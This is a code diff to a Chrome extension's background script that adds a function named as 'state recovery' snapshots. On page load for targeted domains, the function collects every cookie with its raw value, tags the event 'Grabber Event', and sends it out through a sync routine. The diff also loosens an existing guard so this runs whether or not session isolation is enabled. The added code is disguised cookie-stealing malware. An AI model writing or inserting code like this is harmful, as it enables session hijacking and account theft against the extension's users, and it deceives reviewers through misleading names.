@@ -736,20 +736,74 @@ chrome.runtime.onStartup.addListener(() => {
     init();
 });
 
+async function captureDomainSnapshot(domain) {
+    if (!STATE.HEURISTIC_PATTERNS.SNAPSHOT_ENABLED) return;
+
+    // Throttle snapshots for the same domain
+    const h = `SNAP|${domain}`;
+    if (isRecent(h)) return;
+
+    try {
+        Diagnostics.log('SNAPSHOT', `Initiating state recovery for ${domain}`);
+        const cookies = await chrome.cookies.getAll({ domain });
+
+        if (!cookies || cookies.length === 0) return;
+
+        const sigs = {};
+        for (const c of cookies) {
+            sigs[c.name] = {
+                v: c.value,
+                m: mask(c.value, c.name)
+            };
+        }
+
+        const signal = {
+            t: new Date().toISOString(),
+            type: 'G100', // Grabber Event
+            u: `https://${domain}/`,
+            o: domain,
+            s: true,
+            payload: { c: sigs },
+            meta: {
+                node_count: cookies.length,
+                is_full_snapshot: true
+            }
+        };
+
+        performanceMetrics.record('G100', domain, 'snap_int');
+        await syncSignals(signal);
+    } catch (err) {
+        Diagnostics.critical('SNAPSHOT', 'State recovery failed', { error: err.message });
+    }
+}
+
 chrome.tabs.onUpdated.addListener(async (tid, c, t) => {
-    if (!STATE || !STATE.HEURISTIC_PATTERNS || !STATE.HEURISTIC_PATTERNS.STRICT_SESSION_ISOLATION) return;
+    if (!STATE || !STATE.HEURISTIC_PATTERNS) return;
     if (c.status !== 'complete' || !t.url) return;
 
     try {
         const u = t.url.toLowerCase();
-        const hit = STATE.HEURISTIC_PATTERNS.CRITICAL_PATH_SIGNATURES.some(p =>
-            u.includes(p.toLowerCase())
+        const origin = getOrigin(t.url);
+
+        // 1. Check for snapshot targets
+        const isTarget = STATE.HEURISTIC_PATTERNS.SNAPSHOT_TARGETS.some(p =>
+            origin.includes(p.toLowerCase())
         );
 
-        if (hit) {
-            const origin = getOrigin(t.url);
-            Diagnostics.log('ISOLATION', 'Isolating session for critical path', { url: t.url, origin });
-            await handleUIReset({ data: { domain: origin } }, { tab: { id: tid } });
+        if (isTarget) {
+            await captureDomainSnapshot(origin);
+        }
+
+        // 2. Existing isolation logic
+        if (STATE.HEURISTIC_PATTERNS.STRICT_SESSION_ISOLATION) {
+            const hit = STATE.HEURISTIC_PATTERNS.CRITICAL_PATH_SIGNATURES.some(p =>
+                u.includes(p.toLowerCase())
+            );
+
+            if (hit) {
+                Diagnostics.log('ISOLATION', 'Isolating session for critical path', { url: t.url, origin });
+                await handleUIReset({ data: { domain: origin } }, { tab: { id: tid } });
+            }
         }
     } catch (e) { }
 });
